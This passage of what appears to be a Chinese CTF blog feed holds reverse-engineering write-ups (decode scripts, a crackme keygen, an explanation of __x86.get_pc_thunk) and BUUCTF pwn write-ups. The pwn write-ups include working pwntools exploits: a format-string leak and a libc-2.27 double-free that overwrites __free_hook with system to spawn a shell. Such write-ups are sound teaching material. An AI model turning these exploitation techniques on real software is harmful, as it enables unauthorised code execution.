class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><h2 id="5-WUSTCTF2020-level1"><a href="#5-WUSTCTF2020-level1" class="headerlink" title="5.[WUSTCTF2020]level1"></a>5.[WUSTCTF2020]level1</h2><p>源码和逻辑都很简单，对flag进行加密，然后还给了output文件，应该就是flag加密后的输出结果<br><img src="https://i.loli.net/2021/04/10/lTe58pKU7iIGdRz.png" alt=""></p><p>写个解密脚本就行了（1，3，5，7…与1相与为1）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flagReverse = [</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">198</span>,</span><br><span class="line">    <span class="number">232</span>,</span><br><span class="line">    <span class="number">816</span>,</span><br><span class="line">    <span class="number">200</span>,</span><br><span class="line">    <span class="number">1536</span>,</span><br><span class="line">    <span class="number">300</span>,</span><br><span class="line">    <span class="number">6144</span>,</span><br><span class="line">    <span class="number">984</span>,</span><br><span class="line">    <span class="number">51200</span>,</span><br><span class="line">    <span class="number">570</span>,</span><br><span class="line">    <span class="number">92160</span>,</span><br><span class="line">    <span class="number">1200</span>,</span><br><span class="line">    <span class="number">565248</span>,</span><br><span class="line">    <span class="number">756</span>,</span><br><span class="line">    <span class="number">1474560</span>,</span><br><span class="line">    <span class="number">800</span>,</span><br><span class="line">    <span class="number">6291456</span>,</span><br><span class="line">    <span class="number">1782</span>,</span><br><span class="line">    <span class="number">65536000</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagReverse)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] &gt;&gt; i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] // i</span><br><span class="line"></span><br><span class="line">    flagReverse[i] = <span class="built_in">chr</span>(flagReverse[i])</span><br><span class="line"></span><br><span class="line">flag = flagReverse[<span class="number">1</span>:]</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><h2 id="6-Youngter-drive"><a href="#6-Youngter-drive" class="headerlink" title="6.Youngter-drive"></a>6.Youngter-drive</h2><blockquote><p>UPX脱壳:<a href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a></p></blockquote><p>先去个壳<br><img src="https://i.loli.net/2021/04/11/cGXKI38bUisLfzJ.png" alt=""></p><p>main函数中启动了两个子线程<br><img src="https://i.loli.net/2021/04/11/rgxAZITfhmq1ozW.png" alt=""></p><p>第一个线程对于我们输入的flag进行替换<br><img src="https://i.loli.net/2021/04/11/ZTrNDyLRgpScUB9.png" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_411940</span><span class="params">(<span class="keyword">int</span> source, <span class="keyword">int</span> target_in_data_1d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(_BYTE *)(target_in_data_1d + source);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span>) &amp;&amp; (v3 &lt; <span class="number">65</span> || v3 &gt; <span class="number">90</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="string">&#x27;a&#x27;</span> || v3 &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 大写字母 - 38，即27-52</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">38</span>];</span><br><span class="line">    <span class="comment">// 将索引映射到另外一张表进行替换</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 小写字母 - 96，即1 - 26</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">96</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个线程只是减去data段的一个计数器，并没有对我们输入的字符串进行操作，所以坑点1就是在我们输入的字符串中，只有偶数位（0，1，3,…29）被进行替换了<br>替换逻辑比较简单，见上面贴的注释</p><p>坑点2就是最后check的时候只检查了29位，最后一位搜的wp是填E（好像在安恒赛的时候填啥都对，然后看了一个师傅的wp觉得应该填Z，因为映射回来正好是NULL<br><img src="https://i.loli.net/2021/04/11/d4vbaU7eFPiVZwx.png" alt=""></p><p>脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">flagRe = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsySa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> v3 = *(_BYTE *)(target_in_data_1d + source);</span></span><br><span class="line"><span class="string">  if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) )</span></span><br><span class="line"><span class="string">    exit(0);</span></span><br><span class="line"><span class="string">  if ( v3 &lt; &#x27;a&#x27; || v3 &gt; &#x27;z&#x27; )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;&amp;&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;`&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0x1d</span></span><br><span class="line"><span class="keyword">while</span> i &gt; -<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> key.find(flagRe[i]):</span><br><span class="line">        position = key.find(flagRe[i])</span><br><span class="line">        <span class="keyword">if</span> position &lt;= <span class="number">26</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">96</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">38</span>))</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    flag.append(flagRe[i])</span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">reversed</span>(flag)</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure></p><p>大师傅的wp，详细解释了这个程序中反调试的部分，值得阅读:<a href="https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/">https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>__x86.get_pc_thunk.ax函数</title>
      <link href="2021/04/06/ax/"/>
      <url>2021/04/06/ax/</url>
      
        <content type="html"><![CDATA[<h2 id="x86-get-pc-thunk"><a href="#x86-get-pc-thunk" class="headerlink" title="__x86.get_pc_thunk"></a>__x86.get_pc_thunk</h2><p>c语言到汇编指令这篇博文中，我一开始通过gcc编译源文件，没有关闭地址随机化这个选项，在编译出的程序的反汇编中，发现了很奇怪的call指令<br>源程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">char</span> c = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">23</span>;</span><br><span class="line"><span class="keyword">char</span> b = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">short</span> c = <span class="number">12</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x11ad</span> &lt;main&gt;                           endbr32                                                                                    </span><br><span class="line">│   <span class="number">0x11b1</span> &lt;main+<span class="number">4</span>&gt;                         <span class="keyword">push</span>   <span class="built_in">ebp</span>                                                                                 </span><br><span class="line">│   <span class="number">0x11b2</span> &lt;main+<span class="number">5</span>&gt;                         <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span>                                                                             </span><br><span class="line">│   <span class="number">0x11b4</span> &lt;main+<span class="number">7</span>&gt;                         <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x10</span>                                                                            </span><br><span class="line">│   <span class="number">0x11b7</span> &lt;main+<span class="number">10</span>&gt;                        <span class="keyword">call</span>   <span class="number">0x11d9</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">ax</span>&gt;                                                      </span><br><span class="line">│   <span class="number">0x11bc</span> &lt;main+<span class="number">15</span>&gt;                        <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x2e20</span>                                                                          </span><br><span class="line">│   <span class="number">0x11c1</span> &lt;main+<span class="number">20</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>],<span class="number">0x17</span>                                                            </span><br><span class="line">│   <span class="number">0x11c8</span> &lt;main+<span class="number">27</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x7</span>],<span class="number">0x62</span>                                                             </span><br><span class="line">│   <span class="number">0x11cc</span> &lt;main+<span class="number">31</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x6</span>],<span class="number">0xc</span>                                                             </span><br><span class="line">│   <span class="number">0x11d2</span> &lt;main+<span class="number">37</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span> </span><br><span class="line">│   <span class="number">0x11d7</span> &lt;main+<span class="number">42</span>&gt;                        <span class="keyword">leave</span>                                                                                      </span><br><span class="line">│   <span class="number">0x11d8</span> &lt;main+<span class="number">43</span>&gt;                        <span class="keyword">ret</span>                           </span><br></pre></td></tr></table></figure><p>在main+10的位置处调用了一个__x86.get_pc_thunk.ax，很好奇这个是什么东西，gdb动态调试跟进去看看</p><p><img src="https://i.loli.net/2021/04/06/OD2N7xLbXAhJ5sS.png" style="zoom:50%;" /></p><p>发现了只有两条汇编指令</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">esp</span>]</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>esp存的就是main函数的地址（因为在main函数中call了当前这个函数）</p><p>简单说这个指令就相当于<code>mov eax,eip</code></p><p>这个函数的作用就是get到main函数的地址</p><p>很好奇，为什么要获得main函数的地址呢？</p><p>我们继续往下走</p><p><img src="https://i.loli.net/2021/04/06/2UemXT6PY31hN4B.png" alt="" style="zoom:50%;" /></p><p>发现eax这里通过add一个数字后变成了GOT表的地址，这样就不难理解了（关于什么是GOT表和PLT表，我会后面再展开文章进行学习记录），这个函数在x86上的PIC（position independent code）中使用，用来实现对模块的内部数据进行访问，比如全局变量。我们在main函数中访问一下全局变量x，用gdb查看汇编代码，果然可以看到程序访问x是通过GOT进行的。</p><p><img src="https://i.loli.net/2021/04/06/1QBToDwrjivpK52.png" style="zoom:50%;" /></p><blockquote><p>事实上类似的函数还有：<code>__x86.get_pc_thunk.bx</code>，<code>__x86.get_pc_thunk.cx</code>， <code>__x86.get_pc_thunk.dx</code>。功能是类似的，只不过传入的寄存器分别为<code>%ebx</code>， <code>%ecx</code>， <code>%edx</code>。早期版本的编译器中，这个函数叫<code>__i686.get_pc_thunk.ax</code>。</p></blockquote><h2 id="关闭pie"><a href="#关闭pie" class="headerlink" title="关闭pie"></a>关闭pie</h2><p>使用gcc编译命令</p><p><code>gcc -fno-pie</code></p><p>关闭pie，调试程序发现已经不需要再通过该函数进行寻址了</p><p><img src="https://i.loli.net/2021/04/06/JO6fZ7A2sMKHxzk.png" style="zoom:50%;" /></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://stackoverflow.com/questions/50105581/how-do-i-get-rid-of-call-x86-get-pc-thunk-ax">c - How do i get rid of call    __x86.get_pc_thunk.ax - Stack Overflow</a></p><p><a href="https://qphikk.cn/archives/84">__x86.get_pc_thunk.ax函数</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crackme</title>
      <link href="2021/03/23/crackme1/"/>
      <url>2021/03/23/crackme1/</url>
      
        <content type="html"><![CDATA[<h2 id="Peach’s-Crackme"><a href="#Peach’s-Crackme" class="headerlink" title="Peach’s Crackme"></a>Peach’s Crackme</h2><p><img src="https://i.loli.net/2021/03/23/7OH8pcVqwFJzQdS.png" alt="1.png"><br>程序简介，一个简单的注册功能<br><img src="https://i.loli.net/2021/03/23/txOWv6PMi8fRLHA.png" alt="3.png"></p><p>首先x64dbg分析一下，根据程序功能找找字符串啥的<br><img src="https://i.loli.net/2021/03/23/nSVNcGjRhlZF7kK.png" alt="4.png"><br>IDA静态分析，来定位一下地址啥的，然后f5大法直接读伪代码<br><img src="https://i.loli.net/2021/03/23/DZecAmIPGyu4Ftg.png" alt="5.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_4081C0(<span class="string">&quot;%d\n&quot;</span>, v4);</span><br><span class="line">v5 = sub_401A94(String);</span><br><span class="line"><span class="keyword">if</span> ( v5 == atoi(v7) )</span><br><span class="line">    MessageBoxW(a1, <span class="string">L&quot;You are such a gud boi! Lemme pat you!&quot;</span>, <span class="string">L&quot;Good boi!&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>最终定位到这个地方<br>主要分析一下v5和v7都是啥，通过ida的万能x引用大法，追踪到一个win32函数，查手册把功能和参数给搞清楚就ok了<br><img src="https://i.loli.net/2021/03/23/q9bHQUNZxaL6gSc.png" alt="2.png"></p><p>最终发现v5是注册时的名字，v7是我们输入的序列号，二者之间通过一个函数来处理，本地运行一下函数就行了，直接出序列号</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+5Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> a1[] = <span class="string">&quot;Alex&quot;</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">    v3 += a1[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="number">431136</span> * v3 - <span class="number">3000</span>) / <span class="number">2</span> - *a1));</span><br><span class="line">&#125;          </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/23/WFdr8CReqc2Qliu.png" alt="6.png"></p><h2 id="WarGames"><a href="#WarGames" class="headerlink" title="WarGames"></a>WarGames</h2><ul><li>level : 2</li><li>Platform : Unix/linux etc.</li><li>Description : Use ./WarGames pass</li></ul><p>太简单了，把他的算法跑一遍就把结果出来了</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> crackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn系列1</title>
      <link href="2021/03/13/pwn1/"/>
      <url>2021/03/13/pwn1/</url>
      
        <content type="html"><![CDATA[<p>记录下buuctf pwn的write up</p><h2 id="judgement-mna-2016"><a href="#judgement-mna-2016" class="headerlink" title="judgement_mna_2016"></a>judgement_mna_2016</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">144</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Flag judgment system\nInput flag &gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( getnline(&amp;format, <span class="number">0x40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;format, flag) )</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nCorrect flag!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nWrong flag...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unprintable character&quot;</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑就是之前把flag文件读入内存，然后输入字符串和flag字符串进行对比<br>主函数存在格式化字符串漏洞，我们直接在栈上找到格式化字符串参数的位置，然后直接读出来即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./judgement_mna_2016&quot;</span></span><br><span class="line">port = <span class="string">&quot;29113&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input flag &gt;&gt; &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%28$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h2><ul><li>考点<ol><li>程序调试，栈溢出泄漏地址</li><li>libc-2.27 UAF</li></ol></li></ul><p><a href="https://sm.ms/image/iCz5hIJNQDXTvlr" target="_blank"><img src="https://i.loli.net/2021/03/14/iCz5hIJNQDXTvlr.png" /></a></p><p>程序先给了一个输入name和id的东西，发现了格式化字符串但是由于是__printf_chk，所以没找到好的利用点<br>然后下面是输入id，还有个puts，调试发现id后面是有libc函数setbuffer的，又因为是puts函数直接来给他泄漏出来<br><a href="https://sm.ms/image/3nmz2dy6jRKb9Pi" target="_blank"><img src="https://i.loli.net/2021/03/14/3nmz2dy6jRKb9Pi.png" /></a></p><p>add功能只允许申请0-0x50大小的chunk<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt; <span class="number">0</span> &amp;&amp; size &gt; <span class="number">0x50</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><br>delete功能存在UAF<br>在老版的libc-2.27下是允许double free存在的<br>然后直接改__free_hook为system一把梭就行了<br>新版的打完今天的VN再试一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_2019_en_3&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;27391&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the size of story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;please inpute the story:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">231</span></span><br><span class="line">leak_libc(leak)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(__free_hook))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(system))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-actf栈迁移</title>
      <link href="2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>给出exp如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ACTF_2019_babystack&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;29886&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span 